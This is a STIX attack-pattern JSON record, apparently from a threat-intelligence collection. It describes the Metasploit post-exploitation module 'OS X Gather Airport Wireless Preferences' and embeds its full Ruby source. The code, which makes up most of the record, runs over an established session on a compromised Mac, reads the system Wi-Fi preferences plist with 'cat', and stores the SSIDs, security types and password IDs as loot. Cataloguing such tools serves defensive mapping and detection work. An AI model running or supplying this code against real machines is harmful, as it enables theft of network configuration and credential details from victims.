{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c20bf9b-be25-4ac3-adc2-30b0a2570118",
    "created": "2024-08-14T16:33:00.695322Z",
    "modified": "2024-08-14T16:33:00.695326Z",
    "name": "OS X Gather Airport Wireless Preferences",
    "description": " This module will download OS X Airport Wireless preferences from the victim machine.  The preferences file (which is a plist) contains information such as: SSID, Channels, Security Type, Password ID, etc.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_airport.rb",
            "external_id": "enum_airport.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Airport Wireless Preferences',\n        'Description' => %q{\n          This module will download OS X Airport Wireless preferences from the victim\n          machine.  The preferences file (which is a plist) contains information such as:\n          SSID, Channels, Security Type, Password ID, etc.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n  end\n\n  def exec(cmd)\n    tries = 0\n    begin\n      out = cmd_exec(cmd).chomp\n    rescue ::Timeout::Error => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    rescue EOFError => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    end\n  end\n\n  def get_air_preferences\n    pref = exec('cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist')\n    return pref =~ /No such file or directory/ ? nil : pref\n  end\n\n  def save(data)\n    p = store_loot(\n      'apple.airport.preferences',\n      'plain/text',\n      session,\n      data,\n      'com.apple.airport.preferences.plist'\n    )\n\n    print_good(\"#{@peer} - plist saved in #{p}\")\n  end\n\n  def run\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n\n    # Download the plist.  If not found (nil), then bail\n    pref = get_air_preferences\n    if pref.nil?\n      print_error(\"#{@peer} - Unable to find airport preferences\")\n      return\n    end\n\n    # Save the raw version of the plist\n    save(pref)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}